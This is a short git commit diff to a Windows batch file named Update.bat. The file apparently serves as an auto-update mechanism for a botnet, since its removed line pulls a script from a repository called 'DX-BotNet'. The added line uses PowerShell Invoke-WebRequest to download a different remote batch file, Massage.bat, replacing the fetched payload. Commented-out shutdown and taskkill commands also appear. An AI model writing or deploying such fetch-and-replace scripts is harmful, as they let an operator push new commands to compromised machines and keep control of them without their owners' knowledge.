a4f768beb7a2b0e349d1a1f8e6a646e9f2b455cc
AbdulazizDXT <139559982+AbdulazizDXT@users.noreply.github.com>
2023-07-14 21:32:10 +0400

    Update Update.bat

--- Update.bat
+++ Update.bat
@@ -2,7 +2,7 @@
 #shutdown /r /t 00
 #-------------AUTO UPDATE UP.bat SCRIPT---------------#
 del UP.bat
-powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDXT/DX-BotNet/main/UP.bat -OutFile UP.bat"
+powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Massage.bat -OutFile Massage.bat"
 #taskkill /IM cmd.exe /F (Kill Update & Can run after One hour or after restart)
 #-------------COMMANDS---------------#
 #timeout /t 200
